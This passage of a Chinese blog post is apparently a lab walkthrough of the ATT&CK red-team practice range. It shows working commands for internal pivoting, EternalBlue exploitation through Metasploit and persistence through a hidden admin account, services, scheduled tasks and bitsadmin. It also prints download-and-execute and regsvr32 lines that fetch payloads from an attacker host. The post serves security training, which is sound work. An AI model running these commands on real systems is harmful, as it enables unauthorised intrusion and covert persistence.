[+] host called home, sent: 93245 bytes
[+] received output:
(ARP) Target &#39;192.168.52.1&#39; is alive. 00-50-56-C0-00-0B

[+] received output:
(ARP) Target &#39;192.168.52.143&#39; is alive. 00-0C-29-E9-6D-68
(ARP) Target &#39;192.168.52.138&#39; is alive. 00-0C-29-F6-F6-F0
(ARP) Target &#39;192.168.52.141&#39; is alive. 00-0C-29-71-10-BB

[+] received output:
(ARP) Target &#39;192.168.52.254&#39; is alive. 00-50-56-F1-E2-4B

[+] received output:
Scanner module is complete
</code></pre>
<p>143是本机，发现内网存在138和141两台机器，其中138是之前就已经知道是域控的机器（也可以直接使用<code>net view</code>命令进行主机发现）</p>
<p>简单扫端口，他这个端口是倒过来扫的，从高往低</p>
<p>但是想接着打还是不能就着CS的这个socks，太卡了。传一个earthworm上去试试吧。因为这里kali和win7边缘机是在一个网段的，最简单的情况，直接监听一个端口即可，从这里抄命令<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/0nth3way/p/11693188.html">内网穿透利器——EarthWorm</a><br><code>ew_win32.exe -s ssocksd -l 8888</code>，记得再运行一次上面的指令把防火墙打开<br>这里CS最好用execute指令而不是run指令。。。不然ew代理时的输出会一直弹出来<br>这里重启了一下ew，抄两个杀进程指令，一个按名字杀一个按pid杀<br><code>Taskkill /IM firefox.exe /F</code><br><code>Taskkill /PID 26356 /F</code><br>proxychains的配置文件中需要将原先写的socks4改为socks5，ew是不支持socks4的（所以说CS只支持socks4还是有点过时了，一开始跑了半天代理都不通，最后直接上机子看才发现还有这种问题）</p>
<p>然后再try一try nmap。因为ew是socks5的代理，也就能支持udp等各种扫描了。结果ew代理也卡的一比，现在就要考虑是哪里出问题了，经过简单搜索后发现是proxychains的问题。其自带了一个超时设置，默认15s，nmap扫描出的没开的端口全都按超时处理。。。不卡才怪，调到0.1s之后急速扫描（也不是很急速吧。。。扫全部常用端口也要好几分钟。。。）就凑合着用CS的也一样，就少一点信息而已</p>
<h3 id="会话转移"><a href="#会话转移" class="headerlink" title="会话转移"></a>会话转移</h3><p>CS的功能感觉有限，因为有445端口，根据wp这里可以打永恒之蓝，转移到msf打<br>msf上线的方案也有多种，可以直接在CS里面设置一个foreign listener，这里直接选择reverse https。在msfconsole中启动一个对应的handler接受</p>
<p>也可以用msfvenom生成对应的马，这里试一下CS将会话转发给msf</p>
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.68.139
set lport 443
run
</code></pre>
<p>payload的类型要弄对。。。一开始填成了<code>windows/x64/meterpreter/reverse_https</code>，多了一个x64就跑不通了。。然后在CS中直接右键已有的session，<code>spawn</code>中选中配置的foreign listener即可，非常好用</p>
<h3 id="msf利用ms08-068"><a href="#msf利用ms08-068" class="headerlink" title="msf利用ms08 068"></a>msf利用ms08 068</h3><p>msf也自带了主机发现和端口扫描功能，位于<code>post/windows/gather/arp_scanner</code>和<code>auxiliary/scanner/portscan/tcp</code>，效率一般，且都不如nmap的buff加满的扫描能报告可能存在的洞。但感觉proxychains+nmap时受到扫描未开放端口时timeout的影响，不知道直接在被控制机器上装一个nmap是不是会快一点</p>
<p>两台机子都开了445端口，这个是经典windows smb服务，但具体是什么我也不会。。。<br>看答案是用的一个比较老的洞ms08-068和经典ms17 010永恒之蓝打的<br>可以直接<code>search ms08 068</code>找到msf对应的攻击模块<br>考虑网络拓扑模型，由于我们以边缘机win7位跳板发动攻击，内网机器无法访问外网，因此无法使用反弹的方式获取会话。这里的payload选择<code>windows/meterprete/bind_tcp</code>，以tcp正向连接的方式攻击</p>
<p>然而并没有打通。。。msf会显示一套payload打了过去，但是<code>Exploit completed, but no session was created.</code>，尝试再次攻击就会发现直接unreachable，直接打坏了，需要重启才能继续打。。。。计划不通，就当练习msf怎么用了</p>
<h3 id="ms17010永恒之蓝"><a href="#ms17010永恒之蓝" class="headerlink" title="ms17010永恒之蓝"></a>ms17010永恒之蓝</h3><p>search ms17 010寻找可用模块<br>第一天把msf几个模块都打了一遍全都打不通。只有一个<code>auxiliary/admin/smb/ms17_010_command</code>能执行命令，生成session的全都不行。用这个命令上去把防火墙关了也不行<br>第二天用ps_exec+bind_tcp又突然打通了，概率事件。。。后来断了一次之后一模一样的payload又打不通了，感觉msf的转发不是很稳。概率事件。。。但是用CS的转发和earthworm之类的好像也没有稳定过，玄学。</p>
<p>直接用命令执行也能一句一句的打出来一个msf的session。具体见下文</p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>学习一下操作</p>
<h4 id="建立隐藏用户"><a href="#建立隐藏用户" class="headerlink" title="建立隐藏用户"></a>建立隐藏用户</h4><p>创建一个用户名以$结尾的用户不会被net user指令给发现，再偷偷的给这个号加进管理员</p>
<pre><code>net user ghost$ ghost@dc2022 /add
net localgroup administrators ghost$ /add
</code></pre>
<p>实际上还是能在某些地方被看见，然后可以通过更为复杂的手段进行进一步隐藏<br>这里暂未学习（然后直接用这个号在CS上jump进去就行了，当然，也可以直接用之前域管的号）</p>
<h4 id="创建系统服务"><a href="#创建系统服务" class="headerlink" title="创建系统服务"></a>创建系统服务</h4><p>有session的情况下直接upload功能上传文件<br>由于永恒之蓝打进去就直接是SYSTEM权限，所以在接下来的利用过程中不会出现权限的问题。尝试创建一个开机自启服务以进行权限维持。考虑机器位于内网中，无法反向弹出shell，使用msfvenom创建一个正向连接的后门，监听在10000端口<br>同时上传文件后防火墙放行该程序，注意描述处需要使用双引号，路径处无需引号。</p>
<p>然后创建系统服务，注意几个赋值语句的等于号后都有一个空格</p>
<pre><code>meterpreter &gt; upload sysupdate.exe
meterpreter &gt; shell
C:\Windows\system32&gt;netsh firewall add allowedprogram C:\Windows\system32\sysupdate.exe &quot;test&quot; enable
C:\Windows\system32&gt;sc create &quot;SysUpdate&quot; binpath= &quot;C:\Windows\system32\sysupdate.exe&quot;
C:\Windows\system32&gt;sc description &quot;SysUpdate&quot; &quot;system update&quot;
C:\Windows\system32&gt;sc config &quot;SysUpdate&quot; start= auto
C:\Windows\system32&gt;net start &quot;SysUpdate&quot;
</code></pre>
<p>可以在运行services.msc查看已经成功添加了一个服务（但是这里的exe是我直接用msfvenom生成的。。。好像服务需要满足一定的接口所以跑不起来）</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429172712073.png" alt="image-20220429172712073"></p>
<p>用不了删除服务吧<br><code>sc delete &quot;SysUpdate&quot;</code></p>
<h4 id="写入定时计划"><a href="#写入定时计划" class="headerlink" title="写入定时计划"></a>写入定时计划</h4><p><code>schtasks /create /sc minute /mo 5 /tn &quot;check update&quot; /tr C:\Windows\syswow64\sysupdate.exe</code><br>这里也有一个坑，msf上传文件和显示的pwd都是C:\Windows\system32，就算指定上传到system32，最后实际上却传到的地方是C:\Windows\syswow64。<br>并且ls之类的实际上显示的都应当是syswow64的内容，但就是显示自己在system32目录中。。<br>就算在会话里输入shell进入一个windows shell里面，使用<code>echo %cd%</code>查看当前目录，得到的结果仍是system32。但实际上我进入虚拟机在文件系统里面翻了半天，最后发现上传的文件在syswow64中</p>
<p>踩了第二个坑，上述操作是对于某个用户创建一个定时计划，只在用户登录时运行。如果用户不登录，或者本身该账户就没有交互能力，则无法触发。永恒之蓝拿到的权限直接是SYSTEM，属于不可交互的用户，该命令无法完成利用<br>在图形界面中查看会看到如下内容</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210446446.png" alt="image-20220429210446446"></p>
<p>该命令会勾选<code>只在用户登录时运行</code>，但实际上账户确是SYSTEM。也可以尝试指定上一步的影子用户创建定时任务。不过影子用户的话除了攻击者谁又会主动登录呢？</p>
<p>翻了下windows的手册，有提到如何使用系统账户创建服务，加上一个<code>/ru SYSTEM</code>即可<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create#to-schedule-a-task-that-runs-with-system-permissions">schtasks create</a></p>
<p>正向连接之前上传的木马，成功上线</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210911146.png" alt="image-20220429210911146"></p>
<p>实际上msf自带了持久化功能，但是我试着把两个都run了一遍，反弹shell的毫无反应，监听端口的确实看到他开了端口监听，但是用他的metsvc_bind_tcp连上去连不上。。。</p>
<h4 id="命令行文件下载"><a href="#命令行文件下载" class="headerlink" title="命令行文件下载"></a>命令行文件下载</h4><p>但这里是属于运气比较好，永恒之蓝某次人品爆炸打上去了，然后直接传了个文件，要是只有命令执行该怎么传文件呢</p>
<p>因为边缘机提供了web服务，所以可以直接把马传到边缘机上等待下载</p>
<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token punctuation">(</span><span class="token function">new-object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'http://192.168.52.143/sysupdate.exe'</span><span class="token punctuation">,</span><span class="token string">'C:\sysupdate.exe'</span><span class="token punctuation">)</span>
bitsadmin <span class="token operator">/</span>transfer myDownLoadJob <span class="token operator">/</span>download <span class="token operator">/</span>priority normal <span class="token string">"http://192.168.52.143/sysupdate.exe"</span> <span class="token string">"C:\sysupdate.exe"</span>
certutil <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>52<span class="token punctuation">.</span>143<span class="token operator">/</span>sysupdate<span class="token punctuation">.</span>exe C:\sysupdate<span class="token punctuation">.</span>exe
<span class="token function">Start</span><span class="token operator">-</span>BitsTransfer <span class="token operator">-</span>Source <span class="token string">"http://192.168.52.143/sysupdate.exe"</span> <span class="token operator">-</span>Destination <span class="token string">"C:\sysupdate.exe"</span> <span class="token comment" spellcheck="true"># 在win server2008上显示找不到</span>
</code></pre>
<p>msf set command的时候要各种转义<br>下载的时候需要一点点时间，可以尝试<code>set DELAY 5</code>多停留一会</p>
<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>原来这个东西不止能下文件，还能直接启动后门<br>这里的addfile理论上能下东西，下下来再执行恶意软件，也可以直接是一个无效的url（有待考证，建议使用有效url），主要的利用点在于SetNotifyCmdLine，此处可以启动其他地方的已经存在的后门软件，也可以尝试启动刚才下载的软件</p>
<pre class=" language-powershell"><code class="language-powershell">bitsadmin <span class="token operator">/</span>create backdoor
bitsadmin <span class="token operator">/</span>addfile backdoor <span class="token string">"http://192.168.52.143/sysupdate.exe"</span>  <span class="token string">"C:\backdoor.exe"</span>
bitsadmin <span class="token operator">/</span>SetNotifyCmdLine backdoor C:\backdoor<span class="token punctuation">.</span>exe NUL
bitsadmin <span class="token operator">/</span>SetMinRetryDelay <span class="token string">"backdoor"</span> 60 
bitsadmin <span class="token operator">/</span>resume backdoor
</code></pre>
<pre class=" language-powershell"><code class="language-powershell">bitsadmin <span class="token operator">/</span>list <span class="token comment" spellcheck="true"># 列出任务</span>
bitsadmin <span class="token operator">/</span>reset <span class="token comment" spellcheck="true"># 全部清空</span>
bitsadmin <span class="token operator">/</span>complete &lt;name> <span class="token comment" spellcheck="true"># 完成任务</span>
</code></pre>
<p>但是实际上打了一轮屁用没有。。。正向还是反向都收不到。addfile那里的文件下载就没有看到有东西被下下来。。。使用list倒是能看到显示已经TRANSFERRED，但是并没有文件出现，也没有收到shell，也没有端口监听。。。只有使用complete命令文件就被下载下来了，但是此时这个任务也被结束退出掉了，不会出现接下来的启动了。。。所以不如直接用之前的<code>bitsadmin /transfer</code>进行下载，直接在SetNotifyCmdLine处触发。<br>这里再次吐槽一下内网转发，msf虽然显示能够通过session在内网进行端口监听收reverse_tcp，但是我从来没有成功过。。。还是bind_tcp正向连接比较靠谱</p>
<p>查到了某个文章。。。白浪费那么多时间。。。</p>
<blockquote>
<p>Leveraging &#x2F;SetNotifyCmdLine we issue the &#x2F;Complete command and subsequently execute our payload. Without use of &#x2F;Complete BITS will leave our files in a tmp state and not move them to the correct directory within the file system. This usage of &#x2F;SetNotifyCmdLine along with &#x2F;Complete seem to be missing from most examples of using this tool</p>
</blockquote>
<p>这里还有一个全新的打法，因为刚才的打法需要文件落地，就要分成下载和利用两步。这里使用regsvr32.exe做到无文件落地的利用，整个流程只需要将<code>SetNotifyCmdLine</code>这一步的命令替换为msf对应handler中的输出即可<br>如<code>bitsadmin /SetNotifyCmdLine backdoor &quot;regsvr32.exe&quot; &quot;/s /n /u /i:http://192.168.68.139:8080/B2U10FAqa8gY.sct scrobj.dll&quot;</code><br>虽然无木马文件落地，但仍需要添加addfile才能运行，随便写个破烂url即可（但是实践时感觉不存在的破烂url有可能导致bitsadmin不会正常运行？）<br>msf中对应的handler为<code>exploit/multi/script/web_delivery</code>，用show targets查看可提供的payload类型<br>这里选择3，<code>Regsvr32</code>，不过这个打内网不太好打，因为需要目标直接回连msf。除非又整earthworm高强度打洞。这回确实看到回连了，但利用并未成功，进入目标一看PowerShell执行出错了，报错为<code>模块已加载 但对dllinstall的调用失败</code>。这就很难知道哪里出问题了，计划不通</p>
<p>为什么在这个奇怪的软件上花了这么多时间。。。。</p>
<h3 id="CS-jump一键打通"><a href="#CS-jump一键打通" class="headerlink" title="CS jump一键打通"></a>CS jump一键打通</h3><p>域环境下拿到一个域管号&#x3D;&#x3D;&#x3D;无敌<br>直接就着边缘机扫描，从获取的target下直接拿域管账号登录，启用一个smb listener正向连接，psexec上线<br>而我们拿下的边缘机上去就是域管登录，web服务也是我用域管手动启动的，拿到shell之后直接域管权限。mimikatz急速获取凭据。直接用域管凭据畅通无阻，想登录哪就登录哪。</p>
<h3 id="msf-psexec怎么打都打不通"><a href="#msf-psexec怎么打都打不通" class="headerlink" title="msf psexec怎么打都打不通"></a>msf psexec怎么打都打不通</h3><p>然后搜了一下msf的类似功能，也有一个模块，名为<code>exploit/windows/smb/psexec</code>，输入账号密码psexec进行移动，实战结果为，怎么打都打不通，正向反向都连不上。。。又是玄学内网？经典看到已经就着边缘机已经建立起的tcp连接，但是msf这边一直无法获取到session</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/m0_58177121/article/details/119836657">ATT&amp;CK红队评估实战靶场(一)</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_42323763/article/details/115026477">ATT&amp;CK 实战（一）</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html">Temporal Persistence with bitsadmin and schtasks</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://pentestlab.blog/2019/10/30/persistence-bits-jobs/">Persistence – BITS Jobs</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/2536">后渗透之meterpreter使用攻略</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/10626">红队攻防之特殊场景上线cs和msf</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://sh1yan.top/2019/07/28/MSF-Command-Notes/">MSF之命令笔记篇</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/2151">那些年，我们追过的“蓝”</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/1654">Windows下载执行命令大全</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF.html">三大渗透测试框架权限维持技术</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Windows/" rel="tag"># Windows</a>
              <a href="/tags/pentest/" rel="tag"># pentest</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B%20wp.html" rel="prev" title="pwnhub2022春季赛 wp">
      <i class="fa fa-chevron-left"></i> pwnhub2022春季赛 wp
    </a></div>
      <div class="post-nav-item">
    <a href="/Windows%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8.html" rel="next" title="windows免杀入门">
      windows免杀入门 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK%E9%9D%B6%E5%9C%BA-1-%E7%BB%83%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">ATT&amp;CK靶场(1)练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%85%A5%E9%97%A8"><span class="nav-number">1.1.</span> <span class="nav-text">工具入门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meta-Sploit-Framework"><span class="nav-number">1.1.1.</span> <span class="nav-text">Meta Sploit Framework</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#msfvenom"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">msfvenom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfconsole"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">msfconsole</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">基础命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.1.2.2.</span> <span class="nav-text">常用模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E6%93%8D%E4%BD%9C"><span class="nav-number">1.1.1.2.3.</span> <span class="nav-text">会话操作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">1.1.2.</span> <span class="nav-text">Cobalt Strike</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#listener%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">listener模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#attack%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">attack模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A1%B6%E9%83%A8%E6%A0%8F"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">顶部栏</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%BF%E4%B8%8B%E8%BE%B9%E7%BC%98%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">拿下边缘机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">突破secure_file_priv写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#general-log%E5%86%99%E5%85%A5"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">general_log写入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#long-query-time%E6%85%A2%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">long_query_time慢日志写入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#yxcms%E5%BC%B1%E5%AF%86%E7%A0%81%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="nav-number">1.3.2.</span> <span class="nav-text">yxcms弱密码进入后台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E7%8E%AF%E8%8A%82"><span class="nav-number">1.4.</span> <span class="nav-text">渗透环节</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86-amp-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.1.</span> <span class="nav-text">内网代理&amp;端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E8%BD%AC%E7%A7%BB"><span class="nav-number">1.4.2.</span> <span class="nav-text">会话转移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf%E5%88%A9%E7%94%A8ms08-068"><span class="nav-number">1.4.3.</span> <span class="nav-text">msf利用ms08 068</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ms17010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="nav-number">1.4.4.</span> <span class="nav-text">ms17010永恒之蓝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.4.5.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">建立隐藏用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">创建系统服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E8%AE%A1%E5%88%92"><span class="nav-number">1.4.5.3.</span> <span class="nav-text">写入定时计划</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.4.5.4.</span> <span class="nav-text">命令行文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bitsadmin"><span class="nav-number">1.4.5.5.</span> <span class="nav-text">bitsadmin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CS-jump%E4%B8%80%E9%94%AE%E6%89%93%E9%80%9A"><span class="nav-number">1.4.6.</span> <span class="nav-text">CS jump一键打通</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-psexec%E6%80%8E%E4%B9%88%E6%89%93%E9%83%BD%E6%89%93%E4%B8%8D%E9%80%9A"><span class="nav-number">1.4.7.</span> <span class="nav-text">msf psexec怎么打都打不通</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
  <p class="site-author-name" itemprop="name">Z3ratu1</p>
  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">161</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">89</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
      <img src="/./images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
